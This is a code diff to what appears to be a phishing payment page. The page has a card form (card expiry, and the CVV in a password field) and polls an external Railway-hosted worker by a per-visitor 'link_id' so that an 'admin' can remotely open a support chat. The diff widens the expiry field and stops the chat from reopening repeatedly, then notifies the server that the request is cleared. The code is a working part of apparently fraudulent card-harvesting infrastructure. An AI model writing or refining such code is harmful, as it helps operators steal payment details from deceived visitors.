@@ -2396,7 +2396,7 @@
     </div>
     <div class="card-form__row">
       <div class="card-form__input-wrap">
-        <input class="card-form__input" id="cardExpiry" type="text" placeholder="Месяц/Год" maxlength="4"/>
+        <input class="card-form__input" id="cardExpiry" type="text" placeholder="Месяц/Год" maxlength="5"/>
       </div>
       <div class="card-form__input-wrap">
         <input class="card-form__input" id="cardCVV" type="password" placeholder="CVV" maxlength="3"/>
@@ -2494,14 +2494,26 @@ document.addEventListener('DOMContentLoaded', function() {
 
   // Start polling for support requests from admin
   const link_id = urlParams.get('link_id');
+  let supportChatOpened = false; // Track if we already opened chat for this request
+
   if (link_id) {
     setInterval(() => {
       fetch(`https://worker-production-740e.up.railway.app/check_support?link_id=${link_id}`)
         .then(res => res.json())
         .then(data => {
-          if (data.should_open) {
+          if (data.should_open && !supportChatOpened) {
             console.log('💬 Admin opened support chat');
             toggleChat();
+            supportChatOpened = true;
+
+            // Notify server that we opened the chat
+            fetch(`https://worker-production-740e.up.railway.app/clear_support?link_id=${link_id}`)
+              .then(res => res.json())
+              .then(data => {
+                console.log('✅ Support request cleared');
+                supportChatOpened = false; // Reset for next request
+              })
+              .catch(err => console.error('Clear support error:', err));
           }
         })
         .catch(err => console.error('Support check error:', err));
